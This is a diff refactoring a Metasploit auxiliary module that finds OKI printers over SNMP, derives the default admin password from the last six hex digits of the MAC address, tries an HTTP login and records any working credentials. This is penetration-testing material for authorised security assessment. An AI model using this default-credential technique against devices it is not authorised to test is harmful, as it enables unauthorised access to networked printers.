@@ -1,16 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 # TODO: Split this module into two seperate SNMP and HTTP modules.
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SNMPClient
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
   def initialize(info={})
     super(update_info(info,
@@ -28,13 +26,40 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPort.new('SNMPPORT', [true, 'The SNMP Port', 161]),
         OptPort.new('HTTPPORT', [true, 'The HTTP Port', 80])
-      ], self.class)
+      ])
 
     deregister_options('RPORT', 'VHOST')
   end
 
   def cleanup
     datastore['RPORT'] = @org_rport
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def run_host(ip)
@@ -49,8 +74,8 @@ class Metasploit3 < Msf::Auxiliary
       last_six  = mac.value.unpack("H2H2H2H2H2H2").join[-6,6].upcase
       first_six = mac.value.unpack("H2H2H2H2H2H2").join[0,6].upcase
 
-      #check if it is a OKI
-      #OUI list can be found at http://standards.ieee.org/develop/regauth/oui/oui.txt
+      # check if it is a OKI
+      # OUI list can be found at http://standards.ieee.org/develop/regauth/oui/oui.txt
       if first_six ==  "002536" || first_six == "008087" || first_six == "002536"
         sys_name = snmp.get_value('1.3.6.1.2.1.1.5.0').to_s
         print_status("Found: #{sys_name}")
@@ -80,12 +105,13 @@ class Metasploit3 < Msf::Auxiliary
         case response
         when "200"
           print_good("#{rhost}:#{datastore['HTTPPORT']} logged in as: admin/#{last_six}")
-          report_auth_info(
-            :host  => rhost,
-            :port  => datastore['HTTPPORT'],
-            :proto => "tcp",
-            :user  => 'admin',
-            :pass  => last_six
+          report_cred(
+            ip: rhost,
+            port: datastore['HTTPPORT'],
+            service_name: 'http',
+            user: 'admin',
+            password: last_six,
+            proof: response.inspect
           )
         when "401"
           print_error("Default credentials failed")
